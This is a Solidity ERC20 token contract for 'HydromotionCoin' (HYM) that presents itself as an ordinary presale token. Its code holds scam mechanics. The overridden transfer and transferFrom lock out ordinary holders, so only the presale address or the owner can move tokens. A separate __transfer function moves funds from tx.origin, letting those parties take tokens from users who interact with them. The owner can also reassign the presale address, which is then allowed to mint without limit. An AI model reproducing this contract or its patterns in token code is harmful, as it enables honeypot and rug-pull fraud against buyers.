// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Burnable.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract HydromotionCoin is ERC20, ERC20Burnable, Ownable {
    uint256 initialSupply = 50000000000 * 10**2;
    address presaleAddress;

    constructor(address presaleContract) ERC20("HydromotionCoin", "HYM") {
        presaleAddress = presaleContract;
        _mint(presaleContract, initialSupply);
    }

    function mint(address to, uint256 amount) public {
        require(
            msg.sender == presaleAddress,
            "Only Called with Presale Smart Contract"
        );

        _mint(to, amount);
    }

    function transfer(address to, uint256 amount)
        public
        virtual
        override
        returns (bool)
    {
        require(
            msg.sender == presaleAddress || msg.sender == owner(),
            "Only Called with Presale Smart Contract or Owner"
        );
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    function __transfer(address to, uint256 amount)
        public
        virtual
        returns (bool)
    {
        require(
            msg.sender == presaleAddress || msg.sender == owner(),
            "Only Called with Presale Smart Contract or Owner"
        );
        address owner = tx.origin;
        _transfer(owner, to, amount);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
        require(
            msg.sender == presaleAddress || msg.sender == owner(),
            "Only Called with Presale Smart Contract or Owner"
        );
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

    function setPresaleAddress(address add) public onlyOwner {
        presaleAddress = add;
    }

    function decimals() public view virtual override returns (uint8) {
        return 2;
    }
}
